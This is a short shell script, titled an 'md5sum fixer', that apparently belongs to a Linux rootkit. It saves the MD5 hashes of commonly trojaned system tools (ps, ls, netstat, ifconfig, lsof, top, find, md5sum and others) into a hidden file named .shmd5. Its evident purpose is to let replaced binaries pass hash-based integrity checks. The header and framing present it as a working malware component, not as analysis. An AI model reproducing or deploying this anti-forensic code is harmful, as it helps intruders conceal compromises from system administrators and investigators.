# Say hello to md5sum fixer boys n gurls !

if [ -f /sbin/ifconfig ]; then
/usr/bin/md5sum /sbin/ifconfig >> .shmd5
fi
if [ -f /bin/ps ]; then
/usr/bin/md5sum /bin/ps >> .shmd5
fi
if [ -f /bin/ls ]; then
/usr/bin/md5sum /bin/ls >> .shmd5
fi
if [ -f /bin/netstat ]; then
/usr/bin/md5sum /bin/netstat >> .shmd5
fi
if [ -f /usr/bin/find ]; then
/usr/bin/md5sum /usr/bin/find >> .shmd5
fi
if [ -f /usr/bin/top ]; then
/usr/bin/md5sum /usr/bin/top >> .shmd5
fi
if [ -f /usr/sbin/lsof ]; then
/usr/bin/md5sum /usr/sbin/lsof >> .shmd5
fi
if [ -f /usr/bin/slocate ]; then
/usr/bin/md5sum /usr/bin/slocate >> .shmd5
fi
if [ -f /usr/bin/dir ]; then
/usr/bin/md5sum /usr/bin/dir >> .shmd5
fi
if [ -f /usr/bin/md5sum ]; then
/usr/bin/md5sum /usr/bin/md5sum >> .shmd5
fi